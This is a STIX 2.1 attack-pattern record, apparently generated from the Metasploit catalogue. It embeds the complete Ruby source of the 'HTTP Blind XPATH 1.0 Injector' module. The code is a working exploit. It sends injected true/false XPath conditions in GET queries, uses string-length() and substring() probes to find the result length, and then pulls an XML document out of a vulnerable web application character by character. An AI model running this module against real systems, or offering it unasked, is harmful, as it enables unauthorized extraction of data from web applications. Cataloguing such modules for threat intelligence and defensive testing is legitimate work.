{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--89a213b3-991e-464b-a419-ee3d4443e0d6",
    "created": "2024-08-14T16:30:15.619451Z",
    "modified": "2024-08-14T16:30:15.619454Z",
    "name": "HTTP Blind XPATH 1.0 Injector",
    "description": " This module exploits blind XPATH 1.0 injections over HTTP GET requests. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/xpath.rb",
            "external_id": "xpath.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::WmapScanDir\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'   \t\t=> 'HTTP Blind XPATH 1.0 Injector',\n      'Description'\t=> %q{\n        This module exploits blind XPATH 1.0 injections over HTTP GET requests.\n      },\n      'Author' \t\t=> [ 'et [at] metasploit . com' ],\n      'License'\t\t=> BSD_LICENSE))\n\n    register_options(\n      [\n        OptString.new('METHOD', [ true, \"HTTP Method\",'GET']),\n        OptString.new('PATH', [ true,  \"The URI Path\", '/vulnerable.asp']),\n        OptString.new('PRE_QUERY', [ true,  \"Pre-injection HTTP URI Query\", 'p1=v1&p2=v2&p3=v3']),\n        OptString.new('POST_QUERY', [ false,  \"Post-injection HTTP URI Query\", ' ']),\n        OptString.new('ERROR_MSG', [ true, \"False error message\", 'Server Error']),\n        OptString.new('XCOMMAND', [ false, \"XPath command to execute (Default for all XML doc)\", '//*']),\n        OptInt.new('MAX_LEN', [ true, \"Maximum string length\", 20000]),\n        OptBool.new('MAX_OVER', [ true, \"Dont detect result size. Use MAX_LEN instead\", true ]),\n        OptBool.new('CHKINJ', [ false, \"Check XPath injection with error message\", false ]),\n        OptBool.new('DEBUG_INJ', [ false, \"Debug XPath injection\", true ])\n      ])\n\n  end\n\n  def wmap_enabled\n    false\n  end\n\n  def run_host(ip)\n\n    #\n    # Max string len\n    #\n    maxstr = datastore['MAX_LEN']\n\n    conn = true\n\n    rnum=rand(10000)\n\n    # Weird crap only lower case 'and' operand works\n    truecond = \"'%20and%20'#{rnum}'='#{rnum}\"\n    falsecond = \"'%20and%20'#{rnum}'='#{rnum+1}\"\n\n    hmeth = datastore['METHOD']\n    tpath = normalize_uri(datastore['PATH'])\n    prequery = datastore['PRE_QUERY']\n    postquery = datastore['POST_QUERY']\n    emesg = datastore['ERROR_MSG']\n    xcomm = datastore['XCOMMAND']\n\n\n\n    print_status(\"Initializing injection.\")\n\n    if datastore['CHKINJ']\n\n      #\n      # Detect error msg in true condition\n      #\n\n      begin\n        res = send_request_cgi({\n          'uri'  \t\t=>  tpath,\n          'query'     =>  \"#{prequery}#{falsecond}#{postquery}\",\n          'method'   \t=>\thmeth\n        }, 20)\n\n        return if not res\n\n        if res.body.index(emesg)\n          print_status(\"False statement check done.\")\n        else\n          print_error(\"Error message not included in false condition.\")\n          return\n        end\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n        conn = false\n      rescue ::Timeout::Error, ::Errno::EPIPE\n      end\n\n      #\n      # Detect error msg in false condition\n      #\n\n      begin\n        res = send_request_cgi({\n          'uri'  \t\t=>  tpath,\n          'query'     =>  \"#{prequery}#{truecond}#{postquery}\",\n          'method'   \t=>\thmeth\n        }, 20)\n\n        return if not res\n\n        if res.body.index(emesg)\n          print_error(\"Error message included in true condition.\")\n          return\n        else\n          print_status(\"True statement check done.\")\n        end\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n        conn = false\n      rescue ::Timeout::Error, ::Errno::EPIPE\n      end\n\n      return if not conn\n    end\n\n    #\n    # Find length of command result\n    #\n\n    low = 1\n    high = maxstr\n\n    if datastore['MAX_OVER']\n      print_status(\"Max. limit set to #{maxstr} characters\")\n      reslen = maxstr\n    else\n      lenfound = false\n\n      while !lenfound do\n        middle = (low + high) / 2;\n\n        if datastore['DEBUG_INJ']\n          print_status(\"Length Low: #{low} High: #{high} Med: #{middle}\")\n        end\n\n        injlen = \"'%20and%20string-length(#{xcomm})=#{middle}%20and%20'#{rnum}'='#{rnum}\"\n\n        begin\n          res = send_request_cgi({\n            'uri'  \t\t=>  tpath,\n            'query'     =>  \"#{prequery}#{injlen}#{postquery}\",\n            'method'   \t=>\thmeth\n          }, 20)\n\n          return if not res\n\n          if res.body.index(emesg)\n            lenf = false\n          else\n            lenfound = true\n            lenf = true\n            lens = middle\n          end\n        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n          conn = false\n        rescue ::Timeout::Error, ::Errno::EPIPE\n        end\n\n        if !lenf\n          injlen = \"'%20and%20string-length(#{xcomm})<#{middle}%20and%20'#{rnum}'='#{rnum}\"\n\n          begin\n            res = send_request_cgi({\n              'uri'  \t\t=>  tpath,\n              'query'     =>  \"#{prequery}#{injlen}#{postquery}\",\n              'method'   \t=>\thmeth\n            }, 20)\n\n            return if not res\n\n            if res.body.index(emesg)\n              low = middle\n            else\n              high = middle\n            end\n          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n            conn = false\n          rescue ::Timeout::Error, ::Errno::EPIPE\n          end\n        end\n      end\n\n      print_status(\"Result size: #{lens}\")\n      reslen = lens.to_i\n    end\n\n    #\n    # Execute xpath command and guess response\n    #\n\n    namestr = []\n    numchr = 0\n\n    for i in (1..reslen)\n      #\n      # Only alpha range\n      #\n      for k in (32..126)\n        j = \"%\"+(\"%x\" % k)\n\n        # For Xpath 2.0 Blind search may be performed using a fast binary search using the\n        # string-to-codepoints(string) function\n        # injlen = \"'%20and%20string-to-codepoints(substring(#{xcomm},#{i},1))<#{k}%20and%20'#{rnum}'='#{rnum}\"\n\n        # Basic Blind XPath 1.0 Injection\n        injlen = \"'%20and%20substring(#{xcomm},#{i},1)=\\\"#{j}\\\"%20and%20'#{rnum}'='#{rnum}\"\n\n        begin\n          res = send_request_cgi({\n            'uri'  \t\t=>  tpath,\n            'query'     =>  \"#{prequery}#{injlen}#{postquery}\",\n            'method'   \t=>\thmeth\n          }, 20)\n\n          return if not res\n\n          if res.body.index(emesg)\n            # neeeeext\n          else\n            if(numchr >= maxstr)\n              # maximum limit reached\n              print_status(\"#{xcomm}: #{namestr}\")\n              print_status(\"Maximum string length reached.\")\n              return\n            end\n\n            numchr+=1\n\n            comperc = (numchr * 100) / maxstr\n\n            namestr << \"#{k.chr}\"\n            if datastore['DEBUG_INJ']\n              print_status(\"#{comperc}%: '#{k.chr}' #{namestr}\")\n            end\n            break\n          end\n        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n          conn = false\n        rescue ::Timeout::Error, ::Errno::EPIPE\n        end\n      end\n    end\n\n    print_status(\"#{xcomm}: #{namestr}\")\n    print_status(\"Done.\")\n  end\nend\n"
}